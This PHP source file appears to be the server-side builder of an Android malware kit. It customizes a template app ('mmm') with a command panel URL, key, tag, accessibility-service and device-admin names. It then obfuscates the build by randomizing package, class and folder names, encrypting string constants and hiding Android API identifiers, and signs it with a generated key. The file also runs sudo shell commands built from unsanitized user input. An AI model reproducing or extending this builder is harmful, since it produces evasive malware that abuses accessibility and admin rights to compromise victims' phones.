<?php

class utils{

	
	function replaceStringProject($id_user, $url, $name_app, $key, $tag, $nameAccessibilityService, $steps,$nameAdminDevice,$debug, $testing,$miniCrypt, $accessibilityPage){
		//*** 
		$this -> replaceStringFile("/sysbig/tmpfile/$id_user/mmm/app/build.gradle", ".sert.","/sysbig/tmpfile/$id_user/key");
		if($miniCrypt == '1')$this -> replaceStringFile("/sysbig/tmpfile/$id_user/mmm/app/build.gradle", "//implementation 'com.android.support:appcompat-v7:27.1.1'","implementation 'com.android.support:appcompat-v7:27.1.1'");
		//*** 
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'android:label="MMM"','android:label="'.$name_app.'"');
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'android:label="Start Accessibility"','android:label="'.$nameAccessibilityService.'"');
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'NameAdminDevice' ,$nameAdminDevice);
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'replace_1' ,$this -> randString());
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'replace_2' ,$this -> randString());
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'replace_3' ,$this -> randString());

		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', 'CHANGETHISbase64HtmlAccessibilityCusomCHANGETHIS',$accessibilityPage);
		
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', '.urlConnectPanel.',$url);
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', '.key.',$key);
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', '.tag.',$tag);
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', '.nameAccessibilityService.',$nameAccessibilityService);
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', 'startStep = 0;', 'startStep = '.$steps.';');
		if($testing == '0')$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', 'blockCIS = false;', 'blockCIS = true;');
		if($debug == '0')$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java', 'DebugConsole = true;', 'DebugConsole = false;');
		//*** 



		//---File Class Java---
		foreach($this->arrayAllFiles($id_user) as $files){
			$this -> replaceStringFile($files, 'context.KEYGUARD_SERVICE', 'consts.str_keyguard');
			$this -> replaceStringFile($files, 'Context.TELEPHONY_SERVICE', 'consts.str_phone');
			$this -> replaceStringFile($files, 'Intent.ACTION_BATTERY_CHANGED', 'consts.str_BATTERY_CHANGED');
			$this -> replaceStringFile($files, 'BatteryManager.EXTRA_LEVEL', 'consts.str_level');
			$this -> replaceStringFile($files, 'BatteryManager.EXTRA_SCALE', 'consts.str_scale');
			$this -> replaceStringFile($files, 'Context.ACTIVITY_SERVICE', 'consts.str_activity');
			$this -> replaceStringFile($files, 'DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN', 'consts.str_ADD_DEVICE_ADMIN');
			$this -> replaceStringFile($files, 'DevicePolicyManager.EXTRA_DEVICE_ADMIN', 'consts.str_DEVICE_ADMIN');
			$this -> replaceStringFile($files, 'DevicePolicyManager.EXTRA_ADD_EXPLANATION', 'consts.str_ADD_EXPLANATION');
			//$this -> replaceStringFile($files, 'Settings.ACTION_ACCESSIBILITY_SETTINGS', 'consts.str_ACCESSIBILITY_SETTINGS');
			//$this -> replaceStringFile($files, 'Sensor.TYPE_ACCELEROMETER', 'consts.str_sensor');
			//$this -> replaceStringFile($files, '(POWER_SERVICE', 'consts.str_power');
			//$this -> replaceStringFile($files, 'Context.ALARM_SERVICE', 'consts.str_alarm');
			//$this -> replaceStringFile($files, 'Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES', 'consts.str_ACCESSIBILITY_SETTINGS');
		}
	}
	function createIcon($id_user, $iconBase64){
		$this -> base64toPng($iconBase64, "/sysbig/tmpfile/$id_user/icon.png");

		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 72x72 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-hdpi/ic_launcher.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 48x84 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-mdpi/ic_launcher.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 96x96 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-xhdpi/ic_launcher.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 144x144 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-xxhdpi/ic_launcher.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 192x192 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png");

		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 72x72 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-hdpi/ic_launcher_round.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 48x84 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-mdpi/ic_launcher_round.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 96x96 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-xhdpi/ic_launcher_round.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 144x144 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-xxhdpi/ic_launcher_round.png");
		system("sudo convert /sysbig/tmpfile/$id_user/icon.png -resize 192x192 /sysbig/tmpfile/$id_user/mmm/app/src/main/res/mipmap-xxxhdpi/ic_launcher_round.png");
	}
	function pngtoBase64($path){
		$type = pathinfo($path, PATHINFO_EXTENSION);
		$data = file_get_contents($path);
		return 'data:image/png;base64,' . base64_encode($data);
	}

	function base64toPng($base64, $path){
		$img = str_replace('data:image/png;base64,', '', $base64);
		$img = str_replace(' ', '+', $img);
		$data = base64_decode($img);
		file_put_contents($path, $data);
		system("sudo chmod 777 $path");
	}

	function cryptPackage($id_user){
		$newPackage = array('com',$this -> randString(), $this -> randString());
		$strOldPackage = 'com.example.mmm';
		$strNewPackage = $newPackage[0].'.'.$newPackage[1].'.'.$newPackage[2];
		//---build.gradle---
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/build.gradle', $strOldPackage, $strNewPackage);
		//---Manifest---
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', $strOldPackage, $strNewPackage);
		//---File Class Java---
		foreach($this->arrayAllFiles($id_user) as $files){//replace name class to files!
			$this -> replaceStringFile($files, $strOldPackage, $strNewPackage);
		}
		//---Rename Folder Package---
		//* 0
		//* 1
		rename('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example'
					,'/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/'.$newPackage[1]);
		//* 2
		rename('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/'.$newPackage[1].'/mmm'
					,'/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/'.$newPackage[1].'/'.$newPackage[2]);
	}

	function cryptRes($id_user){
		//---Icon drawable ---
		$newNameIcon = $this -> randString();
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'background' ,$newNameIcon );
		rename('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/res/drawable-v24/background.png',
		'/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/res/drawable-v24/'.$newNameIcon.'.png');
		//---Admin Device ---
		$newNameFileAdminDevice = $this -> randString();
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'xml/adm' ,'xml/'.$newNameFileAdminDevice );
		rename('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/res/xml/adm.xml',
		'/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/res/xml/'.$newNameFileAdminDevice.'.xml');
		//---Accessibility ---
		$newNameFileAccessibility = $this -> randString();		
		$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', 'xml/serviceconfig' ,'xml/'.$newNameFileAccessibility );
		rename('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/res/xml/serviceconfig.xml',
		'/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/res/xml/'.$newNameFileAccessibility.'.xml');
	
	}

	function cryptString($id_user){
		$matches = array();
		$textFile = file_get_contents('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java');//read
		preg_match_all('~"([^"]*)"~u', $textFile, $matches);
		$countArray =  count(explode('"', $textFile))/2;
		
		for($i=0;$i<$countArray;$i++){
			 if(($matches[1][$i]!="UTF-8") &&($matches[1][$i]!="")){
			 $keyEn=$this->randString2();
			 $textEn = encryptText($matches[1][$i],$keyEn);
			 $textFile = str_replace("\"".$matches[1][$i]."\"", "decrypt_str(\"$keyEn$textEn\")", $textFile);//Repalce Text
		 }
		}
		file_put_contents('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java',$textFile);//save
		system('chmod 777 /sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/constants.java');
	}	

	function replaceNameFileJavaClass($id_user){
		foreach($this -> arrayAllFiles($id_user) as $file){
			$dir  = dirname($file);
			$nameFileOld = basename($file);
			$nameClassOld = basename($file, ".java");
			$nameFileNew = $this -> randString().'.java';
			$nameClassNew = str_replace(".java", "", $nameFileNew);
			rename("$dir/$nameFileOld","$dir/$nameFileNew");
			foreach($this -> arrayAllFiles($id_user) as $file2){//replace name class to files!
				$this -> replaceStringFile($file2, "$nameClassOld","$nameClassNew");
				$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', "$nameClassOld","$nameClassNew");
			}
		}
	}

	function replaceAllFolder($id_user){
		$arrayFolder = array(
		$this -> randString() => "Activity",
		$this -> randString() => "API",
		$this -> randString() => "Admin",
		$this -> randString() => "Receiver",
		$this -> randString() => "Service",
		$this -> randString() => "Utils"
		);
	
		foreach($arrayFolder as $newFolder => $oldFolder){
			$dir = '/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/';
			foreach($this->arrayAllFiles($id_user) as $files){//replace name class to files!
				$this -> replaceStringFile($files, ".mmm.$oldFolder;",".mmm.$newFolder;");
				$this -> replaceStringFile($files, ".mmm.$oldFolder.",".mmm.$newFolder.");
			}
			rename($dir.$oldFolder, $dir.$newFolder);
			$this -> replaceStringFile('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/AndroidManifest.xml', ".$oldFolder.",".$newFolder.");
		}
	}


	function arrayAllFiles($id_user){
		$nameReturn = array();
	//	$arrayFolder = array("","/Activity","/API","/Admin","/Receiver","/Service","/Utils");
		$arrayFolder = $this->find_all_folders('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm');
		$indexFile = 0;
		foreach($arrayFolder as  $nameFolder){
			$arrayFile = $this -> getFiles('/sysbig/tmpfile/'.$id_user.'/mmm/app/src/main/java/com/example/mmm/'.$nameFolder);
			foreach($arrayFile as $nameFile){
				$nameReturn[$indexFile] = $nameFile;
				$indexFile++;
			}
		}
		return $nameReturn;
	}

	function getFiles($path){
		$dir = opendir($path);
		$array  = array();
		$var=0;
		while($file = readdir($dir)) {
			 if (!is_dir("$path/$file") && $file != '.' && $file != '..') {
					$array[$var] = "$path/$file";
					$var++;
			 }
		}
		return $array;
	}


    function createKey($id_user){
			$ran1=$this->randString();
			$ran2=$this->randString();
			$sign_tool = "keytool -genkey -v -keystore /sysbig/tmpfile/$id_user/key -alias key0 -keyalg RSA -keysize 2048 -validity 99999 -storepass 123123 -keypass 123123 -dname \"CN=$ran1,O=$ran2,C=US\"";
			system($sign_tool);
		}
		
		function replaceStringFile($pathFile, $String, $replaceString){
			$strFile = file_get_contents($pathFile);
			$strFile = str_replace($String, $replaceString, $strFile);
			file_put_contents($pathFile,$strFile);
		}

    function randString(){
			$chars = 'qwertyuiopasdfghjklzxcvbnm';
			$numChars = strlen($chars);
			$string = '';
			$length = rand(3,16);
			for ($i = 0; $i < $length; $i++) {
				$string .= substr($chars, rand(1, $numChars) - 1, 1);
			}
		return $string;
	}

	function randString2(){
		$chars = 'qwertyuiopasdfghjklzxcvbnm';
		$numChars = strlen($chars);
		$string = '';
		$length = 12;
		for ($i = 0; $i < $length; $i++) {
			$string .= substr($chars, rand(1, $numChars) - 1, 1);
		}
	return $string;
	}

	function find_all_folders($dir){ 
		$path = $dir;
		$dir = opendir($dir);
		$array = array();
		$array[0] = "";
		$var = 1;
			while($folder = readdir($dir)) {
				if (is_dir("$path/$folder") && $folder != '.' && $folder != '..') {
					$array[$var] = $folder;
					$var++;
				}
		}
		return $array;
}
}
